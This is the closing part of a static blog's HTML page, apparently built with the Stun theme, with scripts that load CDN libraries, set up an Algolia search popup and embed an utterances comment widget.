src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>window.addEventListener('DOMContentLoaded', function () {
+  $('.header-nav-search').on('click', function (e) {
+    e.stopPropagation();
+
+    $('body').css('overflow', 'hidden');
+    $('.search-popup')
+      .velocity('stop')
+      .velocity('transition.expandIn', {
+        duration: 300,
+        complete: function () {
+          $('.search-popup input').focus();
+        }
+      });
+    $('.search-mask')
+      .velocity('stop')
+      .velocity('transition.fadeIn', {
+        duration: 300
+      });
+  });
+
+  function closeSearch () {
+    $('body').css({ overflow: 'auto' });
+    $('.search-popup').css({ display: 'none' });
+    $('.search-mask').css({ display: 'none' });
+  }
+
+  $('.search-mask, .search-close').on('click', function () {
+    closeSearch();
+  });
+
+  $(document).on('keydown', function (e) {
+    // Escape <=> 27
+    if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+      closeSearch();
+    }
+  });
+
+  var algolia = CONFIG.algolia;
+  if (!algolia && !(algolia.appId && algolia.apiKey && algolia.indexName)) {
+    return console.error('Algolia setting is invalid.');
+  }
+
+  var search = instantsearch({
+    appId: algolia.appId,
+    apiKey: algolia.apiKey,
+    indexName: algolia.indexName,
+    searchParameters: {
+      hitsPerPage: algolia.hits.per_page || 10
+    },
+    searchFunction: function (helper) {
+      var searchInput = $('.search-input').find('input');
+
+      if (searchInput.val()) {
+        helper.search();
+      }
+    }
+  });
+
+  search.addWidget(
+    instantsearch.widgets.searchBox({
+      container: '.search-input',
+      reset: false,
+      magnifier: false,
+      placeholder: algolia.languages.inputPlaceholder
+    })
+  );
+
+  // The hits of search results.
+  search.addWidget(
+    instantsearch.widgets.hits({
+      container: '#algolia-hits',
+      templates: {
+        item: function (data) {
+          var link = data.permalink ? data.permalink : CONFIG.root + data.path;
+          return (
+            '<a href="' + link + '" class="algolia-hit-item-link">' +
+              data._highlightResult.title.value +
+            '</a>'
+          );
+        },
+        empty: function (data) {
+          return (
+            '<div id="algolia-hits-empty">' +
+              algolia.languages.hitsEmpty.replace(/\$\{query}/, data.query) +
+            '</div>'
+          );
+        }
+      },
+      cssClasses: {
+        item: 'algolia-hit-item'
+      }
+    })
+  );
+
+  // The stats of search results.
+  if ($('#algolia-stats')[0]) {
+    search.addWidget(
+      instantsearch.widgets.stats({
+        container: '#algolia-stats',
+        templates: {
+          body: function (data) {
+            var stats = algolia.languages.hitsStats
+              .replace(/\$\{hits}/, data.nbHits)
+              .replace(/\$\{time}/, data.processingTimeMS);
+            return (
+              stats +
+              '<span class="algolia-logo pull-right">' +
+                '<img src="' + CONFIG.root +
+                `${CONFIG.sourcePath.images}/algolia.svg" alt="Algolia" />` +
+              '</span>'
+            );
+          }
+        }
+      })
+    );
+  }
+
+  // The pagination of the results.
+  search.addWidget(
+    instantsearch.widgets.pagination({
+      container: '#algolia-pagination',
+      scrollTo: false,
+      showFirstLast: false,
+      labels: {
+        first: '<i class="fa fa-angle-double-left"></i>',
+        last: '<i class="fa fa-angle-double-right"></i>',
+        previous: '<i class="fa fa-angle-left"></i>',
+        next: '<i class="fa fa-angle-right"></i>'
+      },
+      cssClasses: {
+        root: 'pagination',
+        item: 'pagination-item',
+        link: 'page-number',
+        active: 'current',
+        disabled: 'disabled-item'
+      }
+    })
+  );
+
+  search.start();
+});</script><script>function loadUtterances() {
+  var d = document, s = d.createElement('script');
+  var container = d.getElementById('utterances-container');
+
+  if (!container) {
+    return;
+  }
+  s.src = 'https://utteranc.es/client.js';
+  s.setAttribute('repo', 'ixxzhi/ixxzhi.github.io');
+  s.setAttribute('issue-term', 'title');
+  s.setAttribute('label', 'utterances');
+  s.setAttribute('theme', 'github-light');
+  s.setAttribute('crossorigin', 'anonymous');
+  s.setAttribute('async', '');
+  if (false) {
+    s.setAttribute('data-pjax-rm', '');
+  }
+  container.append(s);
+}
+
+if (false) {
+  loadUtterances();
+} else {
+  window.addEventListener('DOMContentLoaded', loadUtterances, false);
+}</script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
